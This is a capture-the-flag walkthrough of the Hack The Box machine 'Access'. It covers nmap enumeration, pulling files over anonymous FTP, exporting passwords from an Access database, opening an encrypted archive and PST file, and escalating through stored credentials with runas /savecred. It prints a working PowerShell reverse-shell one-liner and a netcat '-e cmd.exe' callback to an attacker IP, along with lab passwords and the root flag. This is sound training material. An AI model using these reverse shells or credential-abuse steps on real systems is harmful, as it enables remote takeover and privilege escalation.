---
machine: Access
platform: Hack The Box
category: Windows
os: Windows
difficulty: Easy
points: 20
tags: [ftp, mdb-access, pst-crack, runas, savedcreds]
date: 2026-01-15
status: retired
summary: "A beginner-friendly Windows box centred on credential hunting through legacy file formats: anonymous FTP access leads to a Microsoft Access database and an encrypted archive, while privilege escalation explores stored Windows credentials. A clean introduction to pivoting between forgotten artifacts and abusing cached secrets."
---
## Enumeration

hostscan:

```bash
──(kali㉿kali)-[~/htb/access]
└─$ nmap 10.129.5.0 -p- -T4 -oN hostscan                                                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 18:15 -0400
Nmap scan report for 10.129.5.0
Host is up (0.037s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 107.08 seconds
```

fingerprinting:

```bash
──(kali㉿kali)-[~/htb/access]
└─$ nmap 10.129.5.0 -p 21,23,80 -T4 -sCV -oN fingerprinting
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 18:18 -0400
Nmap scan report for 10.129.5.0
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
```

Anonymous logon allowed for ftp, definitely investigate that first

I download the ftp share `wget -r --no-passive ftp://anonymous:anonymous@10.129.5.0/`
We get a .zip file called Access Control and a backup.mdb file

We list the tables in the .mdb file and convert the USERINFO table to a .csv, here we find info that may be useful for credentials later.  We compile this fullname and password list

```text
┌──(kali㉿kali)-[~/htb/access]
└─$ cat creds         
John Carter:020481
Mark Smith:010101
Sunita Rahman:000000
Mary Jones:666666
Monica Nunes:123321
```

I tried these passwords to unlock the .zip file to no avail `7za x "Access Control.zip" -p ''`

Back to investigating the mdb files.

Looking at the tables again we see an `auth-users` table, lets investigate that one:
This gives us a much more clear and useful tables:

```bash
──(kali㉿kali)-[~/htb/access/10.129.5.0/Backups]
└─$ mdb-export backup.mdb auth_user               
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

So now we potentially have 3 credpairs, and I instantly want to try the `access4u@security` on the .zip file in the Engineer directory

We run file on the .zip file and see that its AES-256 encrypted so we will use `7z x` to unzip it

After entering the `access4u@security` password the file unzips and populates a file `Access Control.pst`, another strange format "Microsoft Outlook Personal Storage"

## Foothold

With a quick google search we can see that we can install `readpst` to read this format and it converts our `pst` into a `.eml` which has plain strings in it.  Parsing the email with cat We see the contents say that the "security" account password has been changed to `4Cc3ssC0ntr0ller`.  Presumably our foothold user.  Where do we use these creds though?  I looked at telnet and could connect anonymously (of course) but got no responses to my traffic.  FTP failed when I tried to login as `security:4Cc3ssC0ntr0ller` so surely its related to the website.

The website seems only to host a image or video of a data center titled: LON-MC6 though.

After some digging I found my mistake was connecting to the telnet host with `nc` instead of `telnet` this caused it not to interpret the banner correctly leaving me unaware that it is infact a login page.  You are simply intended to gain user access via `telnet <ip>` and entering your username and password when prompted and then you are granted a shell as `access\security`

```text
*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security

C:\Users\security>
```

You can get the user flag here.

The telnet shell is, frankly, horrible.

I spent quite awhile trying different combinations of downloading different shells and uploading them to the box and finally got to a x86 netcat binary which I uploaded to the telnet machine via my local http server.  This produced a different error saying it was blocked by group policy.  With some googling I found that you can just do a direct callback in powershell, which is what I opted for and established a callback to my rlwrap netcat listener.  Quite the upgrade.

```powershell
# the powershell callback command I used
powershell -ep bypass -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.15.78',80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

## Privilege Escalation

While going through my privesc checklist I find:

```powershell
PS C:\Users\security> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
    
PS C:\Users\security> 
```

We see that Administrator (workgroup called ACCESS) has his credentials saved on this machine and we can access them, just not directly.

Whenever you have an account saved and viewable in cmdkey /list you attempt to execute a command as them via `runas /savecred`

```powershell
PS C:\Users\security> runas /savecred /user:ACCESS\Administrator "cmd.exe /c whoami > C:\Users\security\hacked.txt"
PS C:\Users\security> ls


    Directory: C:\Users\security


Mode                LastWriteTime     Length Name                                                      
----                -------------     ------ ----                                                      
d----         8/24/2018   8:37 PM            .yawcam                                                   
d-r--         8/21/2018  11:35 PM            Contacts                                                  
d-r--         8/28/2018   7:51 AM            Desktop                                                   
d-r--         8/21/2018  11:35 PM            Documents                                                 
d-r--         8/21/2018  11:35 PM            Downloads                                                 
d-r--         8/21/2018  11:35 PM            Favorites                                                 
d-r--         8/21/2018  11:35 PM            Links                                                     
d-r--         8/21/2018  11:35 PM            Music                                                     
d-r--         8/21/2018  11:35 PM            Pictures                                                  
d-r--         8/21/2018  11:35 PM            Saved Games                                               
d-r--         8/21/2018  11:35 PM            Searches                                                  
d-r--         8/24/2018   8:39 PM            Videos                                                    
-a---         5/28/2026   6:23 PM         22 hacked.txt                                                
```

We see our PoC worked and now we can execute code from Administrator's privilege

We start up a listener and utilize the x86 netcat .exe we put on the machine earlier while trying to upgrade the shell to call back and get a revshell as root

`runas /savecred /user:ACCESS\Administrator "cmd.exe /c C:\Windows\Temp\nc.exe -nv 10.10.15.78 80 -e cmd.exe"`

```text
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Administrator\Desktop

07/14/2021  03:40 PM    <DIR>          .
07/14/2021  03:40 PM    <DIR>          ..
05/27/2026  10:47 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,339,018,240 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
a10be8c0c5e92a7ec1beb7f907f1b7d5
```

We get the root flag and the box is complete!
